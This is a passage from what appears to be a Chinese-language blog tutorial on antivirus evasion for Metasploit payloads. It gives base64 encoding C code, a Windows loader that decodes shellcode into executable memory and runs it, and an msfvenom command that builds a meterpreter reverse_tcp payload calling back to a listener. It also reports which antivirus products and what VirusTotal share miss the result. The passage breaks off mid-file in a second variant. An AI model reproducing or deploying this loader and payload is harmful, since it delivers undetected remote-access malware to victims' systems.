class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">Base64decode_len</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *bufcoded)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> nbytesdecoded;</span><br><span class=\"line\">    <span class=\"keyword\">register</span> <span class=\"type\">const</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *bufin;</span><br><span class=\"line\">    <span class=\"keyword\">register</span> <span class=\"type\">int</span> nprbytes;</span><br><span class=\"line\"></span><br><span class=\"line\">    bufin = (<span class=\"type\">const</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *)bufcoded;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (pr2six[*(bufin++)] &lt;= <span class=\"number\">63</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    nprbytes = (bufin - (<span class=\"type\">const</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *)bufcoded) - <span class=\"number\">1</span>;</span><br><span class=\"line\">    nbytesdecoded = ((nprbytes + <span class=\"number\">3</span>) / <span class=\"number\">4</span>) * <span class=\"number\">3</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> nbytesdecoded + <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">Base64decode</span><span class=\"params\">(<span class=\"type\">char</span> *bufplain, <span class=\"type\">const</span> <span class=\"type\">char</span> *bufcoded)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> nbytesdecoded;</span><br><span class=\"line\">    <span class=\"keyword\">register</span> <span class=\"type\">const</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *bufin;</span><br><span class=\"line\">    <span class=\"keyword\">register</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *bufout;</span><br><span class=\"line\">    <span class=\"keyword\">register</span> <span class=\"type\">int</span> nprbytes;</span><br><span class=\"line\"></span><br><span class=\"line\">    bufin = (<span class=\"type\">const</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *)bufcoded;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (pr2six[*(bufin++)] &lt;= <span class=\"number\">63</span>);</span><br><span class=\"line\">    nprbytes = (bufin - (<span class=\"type\">const</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *)bufcoded) - <span class=\"number\">1</span>;</span><br><span class=\"line\">    nbytesdecoded = ((nprbytes + <span class=\"number\">3</span>) / <span class=\"number\">4</span>) * <span class=\"number\">3</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    bufout = (<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *)bufplain;</span><br><span class=\"line\">    bufin = (<span class=\"type\">const</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *)bufcoded;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (nprbytes &gt; <span class=\"number\">4</span>) &#123;</span><br><span class=\"line\">        *(bufout++) =</span><br><span class=\"line\">            (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)(pr2six[*bufin] &lt;&lt; <span class=\"number\">2</span> | pr2six[bufin[<span class=\"number\">1</span>]] &gt;&gt; <span class=\"number\">4</span>);</span><br><span class=\"line\">        *(bufout++) =</span><br><span class=\"line\">            (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)(pr2six[bufin[<span class=\"number\">1</span>]] &lt;&lt; <span class=\"number\">4</span> | pr2six[bufin[<span class=\"number\">2</span>]] &gt;&gt; <span class=\"number\">2</span>);</span><br><span class=\"line\">        *(bufout++) =</span><br><span class=\"line\">            (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)(pr2six[bufin[<span class=\"number\">2</span>]] &lt;&lt; <span class=\"number\">6</span> | pr2six[bufin[<span class=\"number\">3</span>]]);</span><br><span class=\"line\">        bufin += <span class=\"number\">4</span>;</span><br><span class=\"line\">        nprbytes -= <span class=\"number\">4</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Note: (nprbytes == 1) would be an error, so just ingore that case */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nprbytes &gt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        *(bufout++) =</span><br><span class=\"line\">            (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)(pr2six[*bufin] &lt;&lt; <span class=\"number\">2</span> | pr2six[bufin[<span class=\"number\">1</span>]] &gt;&gt; <span class=\"number\">4</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nprbytes &gt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">        *(bufout++) =</span><br><span class=\"line\">            (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)(pr2six[bufin[<span class=\"number\">1</span>]] &lt;&lt; <span class=\"number\">4</span> | pr2six[bufin[<span class=\"number\">2</span>]] &gt;&gt; <span class=\"number\">2</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nprbytes &gt; <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">        *(bufout++) =</span><br><span class=\"line\">            (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)(pr2six[bufin[<span class=\"number\">2</span>]] &lt;&lt; <span class=\"number\">6</span> | pr2six[bufin[<span class=\"number\">3</span>]]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    *(bufout++) = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">    nbytesdecoded -= (<span class=\"number\">4</span> - nprbytes) &amp; <span class=\"number\">3</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> nbytesdecoded;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">const</span> <span class=\"type\">char</span> basis_64[] =</span><br><span class=\"line\"><span class=\"string\">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">Base64encode_len</span><span class=\"params\">(<span class=\"type\">int</span> len)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ((len + <span class=\"number\">2</span>) / <span class=\"number\">3</span> * <span class=\"number\">4</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">Base64encode</span><span class=\"params\">(<span class=\"type\">char</span> *encoded, <span class=\"type\">const</span> <span class=\"type\">char</span> *<span class=\"built_in\">string</span>, <span class=\"type\">int</span> len)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i;</span><br><span class=\"line\">    <span class=\"type\">char</span> *p;</span><br><span class=\"line\"></span><br><span class=\"line\">    p = encoded;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; len - <span class=\"number\">2</span>; i += <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">        *p++ = basis_64[(<span class=\"built_in\">string</span>[i] &gt;&gt; <span class=\"number\">2</span>) &amp; <span class=\"number\">0x3F</span>];</span><br><span class=\"line\">        *p++ = basis_64[((<span class=\"built_in\">string</span>[i] &amp; <span class=\"number\">0x3</span>) &lt;&lt; <span class=\"number\">4</span>) |</span><br><span class=\"line\">            ((<span class=\"type\">int</span>)(<span class=\"built_in\">string</span>[i + <span class=\"number\">1</span>] &amp; <span class=\"number\">0xF0</span>) &gt;&gt; <span class=\"number\">4</span>)];</span><br><span class=\"line\">        *p++ = basis_64[((<span class=\"built_in\">string</span>[i + <span class=\"number\">1</span>] &amp; <span class=\"number\">0xF</span>) &lt;&lt; <span class=\"number\">2</span>) |</span><br><span class=\"line\">            ((<span class=\"type\">int</span>)(<span class=\"built_in\">string</span>[i + <span class=\"number\">2</span>] &amp; <span class=\"number\">0xC0</span>) &gt;&gt; <span class=\"number\">6</span>)];</span><br><span class=\"line\">        *p++ = basis_64[<span class=\"built_in\">string</span>[i + <span class=\"number\">2</span>] &amp; <span class=\"number\">0x3F</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (i &lt; len) &#123;</span><br><span class=\"line\">        *p++ = basis_64[(<span class=\"built_in\">string</span>[i] &gt;&gt; <span class=\"number\">2</span>) &amp; <span class=\"number\">0x3F</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (i == (len - <span class=\"number\">1</span>)) &#123;</span><br><span class=\"line\">            *p++ = basis_64[((<span class=\"built_in\">string</span>[i] &amp; <span class=\"number\">0x3</span>) &lt;&lt; <span class=\"number\">4</span>)];</span><br><span class=\"line\">            <span class=\"comment\">//    *p++ = &#x27;=&#x27;;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            *p++ = basis_64[((<span class=\"built_in\">string</span>[i] &amp; <span class=\"number\">0x3</span>) &lt;&lt; <span class=\"number\">4</span>) |</span><br><span class=\"line\">                ((<span class=\"type\">int</span>)(<span class=\"built_in\">string</span>[i + <span class=\"number\">1</span>] &amp; <span class=\"number\">0xF0</span>) &gt;&gt; <span class=\"number\">4</span>)];</span><br><span class=\"line\">            *p++ = basis_64[((<span class=\"built_in\">string</span>[i + <span class=\"number\">1</span>] &amp; <span class=\"number\">0xF</span>) &lt;&lt; <span class=\"number\">2</span>)];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//*p++ = &#x27;=&#x27;;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    *p++ = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p - encoded;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>base64.h</code>文件内容：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> _BASE64_H_</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _BASE64_H_</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> __cplusplus</span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"string\">&quot;C&quot;</span> &#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"title function_\">Base64encode_len</span><span class=\"params\">(<span class=\"type\">int</span> len)</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"title function_\">Base64encode</span><span class=\"params\">(<span class=\"type\">char</span> * coded_dst, <span class=\"type\">const</span> <span class=\"type\">char</span> *plain_src, <span class=\"type\">int</span> len_plain_src)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"title function_\">Base64decode_len</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> * coded_src)</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"title function_\">Base64decode</span><span class=\"params\">(<span class=\"type\">char</span> * plain_dst, <span class=\"type\">const</span> <span class=\"type\">char</span> *coded_src)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> __cplusplus</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span> <span class=\"comment\">//_BASE64_H_</span></span></span><br></pre></td></tr></table></figure>\n\n<p><code>shellcode.c</code>文件内容：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;base64.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> buf[] =</span><br><span class=\"line\"><span class=\"string\">&quot;msf base64 code here&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 原po代码报错，这里做了一些强制转换和类型修正</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span>* argv[])</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> str1[<span class=\"number\">1000</span>] = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">    Base64decode(str1, (<span class=\"type\">char</span>*)buf);</span><br><span class=\"line\">    LPVOID Memory;</span><br><span class=\"line\">    Memory = VirtualAlloc(<span class=\"literal\">NULL</span>, <span class=\"keyword\">sizeof</span>(str1), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(Memory, str1, <span class=\"keyword\">sizeof</span>(str1));</span><br><span class=\"line\">    ((<span class=\"type\">void</span>(*)())Memory)();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>使用msf生成base64编码的shellcode：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p  windows/meterpreter/reverse_tcp --encrypt base64  lhost=192.168.174.128 lport=6666  -f c &gt; shell.c</span><br></pre></td></tr></table></figure>\n\n<p>把<code>shell.c</code>的内容复制到上面<code>shellcode.c</code>文件中。vs2019编译，关闭杀软，msf可成功上线。</p>\n<p>打开杀软，火绒可以查杀，<strong>360不能查杀</strong>（原po火绒静态查杀会报毒，但行为检测没有反应，360全通过）。</p>\n<p>virustotal.com查杀率为21&#x2F;68（原po为28&#x2F;69）。</p>\n<p><img src=\"/./images/202205301526558.png\" alt=\"image-20220530152630449\"></p>\n<h3 id=\"方法8-base64加密2（VT免杀率17-67）\"><a href=\"#方法8-base64加密2（VT免杀率17-67）\" class=\"headerlink\" title=\"方法8 base64加密2（VT免杀率17&#x2F;67）\"></a>方法8 base64加密2（VT免杀率17&#x2F;67）</h3><p>另外一种base64加密方式，和方法7类似，实现代码略有不同。</p>\n<p><code>base64.c</code>文件内容：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//  base64.c</span></span><br><span class=\"line\"><span class=\"comment\">//  base64</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//  Created by guofu on 2017/5/25.</span></span><br><span class=\"line\"><span class=\"comment\">//  Copyright © 2017年 guofu. All rights reserved.</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">*  转解码过程</span></span><br><span class=\"line\"><span class=\"comment\">*  3 * 8 = 4 * 6; 3字节占24位, 4*6=24</span></span><br><span class=\"line\"><span class=\"comment\">*  先将要编码的转成对应的ASCII值</span></span><br><span class=\"line\"><span class=\"comment\">*  如编码: s 1 3</span></span><br><span class=\"line\"><span class=\"comment\">*  对应ASCII值为: 115 49 51</span></span><br><span class=\"line\"><span class=\"comment\">*  对应二进制为: 01110011 00110001 00110011</span></span><br><span class=\"line\"><span class=\"comment\">*  将其6个分组分4组: 011100 110011 000100 110011</span></span><br><span class=\"line\"><span class=\"comment\">*  而计算机是以8bit存储, 所以在每组的高位补两个0如下:</span></span><br><span class=\"line\"><span class=\"comment\">*  00011100 00110011 00000100 00110011对应:28 51 4 51</span></span><br><span class=\"line\"><span class=\"comment\">*  查找base64 转换表 对应 c z E z</span></span><br><span class=\"line\"><span class=\"comment\">*</span></span><br><span class=\"line\"><span class=\"comment\">*  解码</span></span><br><span class=\"line\"><span class=\"comment\">*  c z E z</span></span><br><span class=\"line\"><span class=\"comment\">*  对应ASCII值为 99 122 69 122</span></span><br><span class=\"line\"><span class=\"comment\">*  对应表base64_suffix_map的值为 28 51 4 51</span></span><br><span class=\"line\"><span class=\"comment\">*  对应二进制值为 00011100 00110011 00000100 00110011</span></span><br><span class=\"line\"><span class=\"comment\">*  依次去除每组的前两位, 再拼接成3字节</span></span><br><span class=\"line\"><span class=\"comment\">*  即: 01110011 00110001 00110011</span></span><br><span class=\"line\"><span class=\"comment\">*  对应的就是s 1 3</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;base64.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// base64 转换表, 共64个</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">const</span> <span class=\"type\">char</span> base64_alphabet[] = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;A&#x27;</span>, <span class=\"string\">&#x27;B&#x27;</span>, <span class=\"string\">&#x27;C&#x27;</span>, <span class=\"string\">&#x27;D&#x27;</span>, <span class=\"string\">&#x27;E&#x27;</span>, <span class=\"string\">&#x27;F&#x27;</span>, <span class=\"string\">&#x27;G&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;H&#x27;</span>, <span class=\"string\">&#x27;I&#x27;</span>, <span class=\"string\">&#x27;J&#x27;</span>, <span class=\"string\">&#x27;K&#x27;</span>, <span class=\"string\">&#x27;L&#x27;</span>, <span class=\"string\">&#x27;M&#x27;</span>, <span class=\"string\">&#x27;N&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;O&#x27;</span>, <span class=\"string\">&#x27;P&#x27;</span>, <span class=\"string\">&#x27;Q&#x27;</span>, <span class=\"string\">&#x27;R&#x27;</span>, <span class=\"string\">&#x27;S&#x27;</span>, <span class=\"string\">&#x27;T&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;U&#x27;</span>, <span class=\"string\">&#x27;V&#x27;</span>, <span class=\"string\">&#x27;W&#x27;</span>, <span class=\"string\">&#x27;X&#x27;</span>, <span class=\"string\">&#x27;Y&#x27;</span>, <span class=\"string\">&#x27;Z&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;a&#x27;</span>, <span class=\"string\">&#x27;b&#x27;</span>, <span class=\"string\">&#x27;c&#x27;</span>, <span class=\"string\">&#x27;d&#x27;</span>, <span class=\"string\">&#x27;e&#x27;</span>, <span class=\"string\">&#x27;f&#x27;</span>, <span class=\"string\">&#x27;g&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;h&#x27;</span>, <span class=\"string\">&#x27;i&#x27;</span>, <span class=\"string\">&#x27;j&#x27;</span>, <span class=\"string\">&#x27;k&#x27;</span>, <span class=\"string\">&#x27;l&#x27;</span>, <span class=\"string\">&#x27;m&#x27;</span>, <span class=\"string\">&#x27;n&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;o&#x27;</span>, <span class=\"string\">&#x27;p&#x27;</span>, <span class=\"string\">&#x27;q&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>, <span class=\"string\">&#x27;s&#x27;</span>, <span class=\"string\">&#x27;t&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;u&#x27;</span>, <span class=\"string\">&#x27;v&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>, <span class=\"string\">&#x27;x&#x27;</span>, <span class=\"string\">&#x27;y&#x27;</span>, <span class=\"string\">&#x27;z&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;0&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>, <span class=\"string\">&#x27;4&#x27;</span>, <span class=\"string\">&#x27;5&#x27;</span>, <span 